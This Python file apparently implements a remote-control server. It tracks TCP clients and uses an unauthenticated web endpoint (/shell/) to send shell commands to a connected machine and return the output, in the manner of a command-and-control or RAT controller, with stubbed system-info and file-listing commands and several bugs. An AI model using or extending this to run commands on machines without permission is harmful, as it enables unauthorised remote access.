from os import name
from platform import java_ver
from fastapi import FastAPI
import threading
import uvicorn
import socket
import json
import time

socketHost = 'localhost'
socketPort = 8088
appsl = FastAPI()
server = socket.socket(family=socket.AF_INET, type=socket.SOCK_STREAM)
socket_conns = {}

# region - TCP Connections

def tcp_conn(client_socket, address): # TCP connection daemon thread
    while True:
        try:
            recv_data = client_socket.recv(2048).decode()
            json_data = json.loads(recv_data)
            match json_data['type']:
                case 'coltroller': # Received TCP request from controller
                    controller_cmd(client_socket,json_data['content'])
                #case 'client': # Received TCP request from client
                    #client_msg(json_data['content'],address)
        except:
            print(end='')


def listen_tcp():
    while True:
        client_socket,address = server.accept() # Accept TCP connection
        print('Connection ' + str(address)) # Print connection base info
        conn_name = address[0] + ':' + str(address[1])
        socket_conns[conn_name] = client_socket # add connection to dic
        threading.Thread(target=tcp_conn,args=(client_socket,address),daemon=True,name=conn_name).start()

# endregion

# region - WebAPI

@appsl.get("/")
def server_version():
    return { 'Server-Version': '0.1' }


@appsl.get("/list/")
def list_connections():
    conn_list = {}
    print(threading.enumerate())
    for key in list(socket_conns.keys()):
        conn_list[key] = str(socket_conns[key])
    return conn_list


@appsl.get("/shell/{conn_address}")
def exec_shell(conn_address:str,command:str=None):
    shell = socket_conns[conn_address]
    shell.send(json.dumps({
        'type': 'shell',
        'content': command
    }).encode())
    recv_length = 2048
    while True:
        recv_data = shell.recv(recv_length).decode()
        json_data = json.loads(recv_data)
        match json_data['type']:
            case 'length':
                recv_length = json_data['content']
                shell.send(json.dumps({
                    'type': 'okay'
                }).encode())
            case 'data':
                return json_data['content']

#endregion

def controller_cmd(client_socket,cmd):
    match cmd:
        case 'getsysinfo':
            print()
        case 'listfile':
            print()
        case 'hello':
            client_socket.send(json.dumps({
                'content': 'hello'
            }).encode())


def client_msg(msg,address):
    print(msg, end=' ')
    print(address)

# region - Heartbeat check alive

def client_heartbeat():
    while True:
        for key in list(socket_conns.keys()):
            try:
                heartbeat = socket_conns[key]
                heartbeat.send(json.dumps({
                    'type': 'heartbeat'
                }).encode())
                recv_data = heartbeat.recv(2048).decode()
                json_data = json.dumps(recv_data)
                if json_data['content'] != 'alive':
                    print("Undefind " + key)
                    socket_conns.pop(key)
                    for thread in threading.enumerate():
                        if thread.name == key:
                            thread.join()
                            thread.setDaemon(False)
            except:
                print("Connection lost " + key)
                socket_conns.pop(key)
                for thread in threading.enumerate():
                    if thread.name == key:
                        thread.join()
                        thread.setDaemon(False)
        time.sleep(1)

# endregion

# region - Run service in thread

def fastapi(): # fastapi service
    uvicorn.run(appsl, host='0.0.0.0', port=8090)


def tcplistener(): # socket tcp service
    server.bind((socketHost, socketPort))
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.listen(128)
    print("\033[0;32msocket listen on\033[0m" + ": " + socketHost + ":" + str(socketPort))
    listen_tcp()

# endregion

if __name__ == "__main__":
    fastAPI = threading.Thread(target=fastapi,name='FastAPI').start()
    tcpListener = threading.Thread(target=tcplistener,name='TCPListener').start()
    heartbeat = threading.Thread(target=client_heartbeat,name='HeartBeat').start()
